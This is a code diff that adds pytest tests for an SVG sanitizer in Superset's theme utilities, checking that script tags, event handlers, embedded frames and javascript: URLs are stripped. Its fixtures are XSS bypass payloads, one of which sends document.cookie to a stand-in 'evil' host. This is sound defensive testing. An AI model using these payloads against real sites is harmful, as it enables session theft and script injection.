@@ -28,6 +28,7 @@ from superset.themes.utils import (
     sanitize_theme_tokens,
     validate_font_urls,
 )
+from superset.utils.core import sanitize_svg_content
 
 
 @pytest.mark.parametrize(
@@ -95,6 +96,111 @@ def test_sanitize_theme_tokens_with_svg():
 
     assert "script" not in result["token"]["brandSpinnerSvg"].lower()
     assert result["token"]["colorPrimary"] == "#ff0000"  # Other tokens unchanged
+
+
+# Payloads that slipped past the previous regex-based sanitizer because
+# ``<script[^>]*>.*?</script>`` required a literal ``</script>`` closing tag
+# while browsers accept several HTML5 variants as valid script end tags.
+SVG_XSS_BYPASS_PAYLOADS = [
+    # Trailing whitespace in the closing tag.
+    '<svg xmlns="http://www.w3.org/2000/svg" width="70"><script>alert(1)</script >',
+    # Self-closing script with an external src via ``href``.
+    '<svg xmlns="http://www.w3.org/2000/svg">'
+    '<script href="https://evil.example/x.js"/></svg>',
+    # HTML5 self-closing end-tag form.
+    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script/>',
+    # Extra attribute on the closing tag.
+    '<svg><script>fetch("//evil/"+document.cookie)</script foo>',
+]
+
+
+@pytest.mark.parametrize("payload", SVG_XSS_BYPASS_PAYLOADS)
+def test_sanitize_svg_content_blocks_script_bypass_variants(payload):
+    """sanitize_svg_content must strip <script> regardless of end-tag form."""
+    cleaned = sanitize_svg_content(payload)
+    lowered = cleaned.lower()
+    assert "<script" not in lowered
+    assert "alert(1)" not in lowered
+    assert "document.cookie" not in lowered
+    assert "evil.example" not in lowered
+
+
+@pytest.mark.parametrize("payload", SVG_XSS_BYPASS_PAYLOADS)
+def test_sanitize_theme_tokens_blocks_script_bypass_variants(payload):
+    """Theme-level sanitization must also strip the regex-bypass payloads."""
+    theme_config = {"token": {"brandSpinnerSvg": payload}}
+    result = sanitize_theme_tokens(theme_config)
+    cleaned = result["token"]["brandSpinnerSvg"].lower()
+    assert "<script" not in cleaned
+    assert "alert(1)" not in cleaned
+    assert "document.cookie" not in cleaned
+    assert "evil.example" not in cleaned
+
+
+def test_sanitize_svg_content_strips_event_handlers():
+    """Event handler attributes must be dropped by the allowlist sanitizer."""
+    payload = '<svg onload="alert(1)"><rect width="10" onclick="alert(2)"/></svg>'
+    cleaned = sanitize_svg_content(payload).lower()
+    assert "onload" not in cleaned
+    assert "onclick" not in cleaned
+    assert "alert" not in cleaned
+
+
+def test_sanitize_svg_content_strips_foreign_and_embedded_tags():
+    """foreignObject/iframe/object/embed must not survive sanitization."""
+    payload = (
+        "<svg>"
+        "<foreignObject><iframe src='https://evil.example'></iframe>"
+        "</foreignObject>"
+        "<object data='https://evil.example'></object>"
+        "<embed src='https://evil.example'>"
+        "</svg>"
+    )
+    cleaned = sanitize_svg_content(payload).lower()
+    for forbidden in ("<foreignobject", "<iframe", "<object", "<embed"):
+        assert forbidden not in cleaned
+
+
+def test_sanitize_svg_content_strips_javascript_url_attrs():
+    """Attributes carrying javascript: URLs must not survive sanitization."""
+    payload = (
+        '<svg xmlns="http://www.w3.org/2000/svg">'
+        '<a href="javascript:alert(1)"><rect width="10" height="10"/></a>'
+        "</svg>"
+    )
+    cleaned = sanitize_svg_content(payload).lower()
+    assert "javascript:" not in cleaned
+
+
+def test_sanitize_svg_content_preserves_legitimate_svg_features():
+    """Benign SVG — geometry, gradients, and animations — must be preserved."""
+    payload = (
+        '<svg xmlns="http://www.w3.org/2000/svg" width="70" height="70" '
+        'viewBox="0 0 70 70">'
+        '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/>'
+        '<stop offset="1" stop-color="#000"/></linearGradient></defs>'
+        '<rect width="10" height="10" fill="url(#g)"/>'
+        '<circle cx="35" cy="35" r="20" stroke="black" fill="blue">'
+        '<animate attributeName="opacity" from="0" to="1" dur="2s"/>'
+        "</circle>"
+        "</svg>"
+    )
+    cleaned = sanitize_svg_content(payload)
+    for keep in (
+        "<svg",
+        "<rect",
+        "<circle",
+        "<animate",
+        "<lineargradient",
+        "<stop",
+        'viewBox="0 0 70 70"',
+    ):
+        assert keep.lower() in cleaned.lower()
+
+
+def test_sanitize_svg_content_handles_empty_input():
+    assert sanitize_svg_content("") == ""
+    assert sanitize_svg_content("   ") == ""
 
 
 def test_sanitize_theme_tokens_with_url():
